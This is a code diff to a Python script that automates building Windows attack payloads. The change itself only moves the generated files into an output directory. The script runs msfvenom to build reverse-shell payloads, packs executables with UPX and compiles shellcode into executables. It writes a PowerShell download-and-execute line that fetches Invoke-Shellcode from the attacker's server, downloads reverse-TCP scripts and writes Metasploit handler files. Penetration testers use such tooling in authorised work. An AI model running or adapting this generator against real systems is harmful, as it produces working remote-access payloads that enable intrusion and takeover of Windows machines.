@@ -60,12 +60,12 @@ httpd.serve_forever()
 
 SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
 WINE_DIR = '{}/wine'.format(SCRIPT_DIR)
+OUTPUT_DIR = '{}/output'.format(SCRIPT_DIR)
 
 
 def make_executable(f):
-    fname = '{}/{}'.format(SCRIPT_DIR, f)
-    st = os.stat(fname)
-    os.chmod(fname, st.st_mode | stat.S_IEXEC)
+    st = os.stat(f)
+    os.chmod(f, st.st_mode | stat.S_IEXEC)
 
 
 def add_handler(payload, server, port, rhost=False):
@@ -83,7 +83,7 @@ def add_handler(payload, server, port, rhost=False):
 
 def write_text_file(filename, content):
     print("Writing {} ...".format(filename))
-    with open('{}/{}'.format(SCRIPT_DIR, filename), 'wt') as f:
+    with open(filename, 'wt') as f:
         f.write(content)
     print("Done")
     print()
@@ -211,30 +211,30 @@ for p in PAYLOADS:
         host_s = "RHOST"
     else:
         host_s = "LHOST"
-    command = 'msfvenom --platform windows -p {} -f {} -e generic/none -o {}/{}.{} {}={} LPORT={}'.format(p['payload'], p['format'], SCRIPT_DIR, p['filename'], p['format'], host_s, SERVER, p['port'])
+    command = 'msfvenom --platform windows -p {} -f {} -e generic/none -o {}/{}.{} {}={} LPORT={}'.format(p['payload'], p['format'], OUTPUT_DIR, p['filename'], p['format'], host_s, SERVER, p['port'])
     execute_command(command)
     handler += add_handler(p['payload'], SERVER, p['port'], rhost)
     print()
     if p['format'] == 'exe':
         print("Generating packed payload...")
-        command = 'upx -9 -f -o {}/upx_{}.exe {}/{}.{}'.format(SCRIPT_DIR, p['filename'], SCRIPT_DIR, p['filename'], p['format'])
+        command = 'upx -9 -f -o {}/upx_{}.exe {}/{}.{}'.format(OUTPUT_DIR, p['filename'], OUTPUT_DIR, p['filename'], p['format'])
         execute_command(command)
         print()
     elif p['format'] == 'py':
         # add shellcode handler stuff
         print("Adding python stub")
-        tmp_file = '{}/{}.{}'.format(SCRIPT_DIR, p['filename'], p['format'])
+        tmp_file = '{}/{}.{}'.format(OUTPUT_DIR, p['filename'], p['format'])
         buf = open(tmp_file).read()
         with open(tmp_file, 'wt') as tf:
             tf.write(PY_TEMPLATE.format(buf))
         print("Generating Python executable")
         execute_command('wine pyinstaller --onefile --distpath=. {}'.format(tmp_file), get_wine_env())
-        os.remove('{}/{}.spec'.format(SCRIPT_DIR, p['filename']))
+        os.remove('{}/{}.spec'.format(OUTPUT_DIR, p['filename']))
         os.remove(tmp_file)
         print("Done")
         print()
     elif p['format'] == 'ps1':
-        tmp_file = '{}/{}.{}'.format(SCRIPT_DIR, p['filename'], p['format'])
+        tmp_file = '{}/{}.{}'.format(OUTPUT_DIR, p['filename'], p['format'])
         buf = open(tmp_file).read()
         os.remove(tmp_file)
 
@@ -248,8 +248,8 @@ for p in PAYLOADS:
         ps1 = "iex(new-object net.webclient).downloadstring('http://{}:{}/invsc.ps1')\n".format(SERVER, WEBSERVER_PORT)
         ps1 += "Invoke-Shellcode -Shellcode @({})\n".format(buf)
 
-        write_text_file('{}.txt'.format(p['filename']), txt)
-        write_text_file('{}.ps1'.format(p['filename']), ps1)
+        write_text_file('{}/{}.txt'.format(OUTPUT_DIR, p['filename']), txt)
+        write_text_file('{}/{}.ps1'.format(OUTPUT_DIR, p['filename']), ps1)
 
 print("Adding additional handlers ...")
 for h in ADDITIONAL_HANDLERS:
@@ -261,20 +261,20 @@ print("Done")
 print()
 
 print("Downloading reverse TCP")
-download_file(PS_REV_TCP_URL, 'reverse.ps1')
+download_file(PS_REV_TCP_URL, '{}/reverse.ps1'.format(OUTPUT_DIR))
 print("Done")
 print()
 
 print("Downloading Invoke-Shellcode")
-download_file(PS_INV_SC_URL, 'invsc.ps1')
+download_file(PS_INV_SC_URL, '{}/invsc.ps1'.format(OUTPUT_DIR))
 print("Done")
 print()
 
 
-write_text_file('handler.rc', handler)
-write_text_file('webserver.py', WEBSERVER)
-make_executable('webserver.py')
-write_text_file('commands.txt', commands)
+write_text_file('{}/handler.rc'.format(OUTPUT_DIR), handler)
+write_text_file('{}/webserver.py'.format(OUTPUT_DIR), WEBSERVER)
+make_executable('{}/webserver.py'.format(OUTPUT_DIR))
+write_text_file('{}/commands.txt'.format(OUTPUT_DIR), commands)
 
 print("Cleanup")
 for x in ('build', 'wine'):
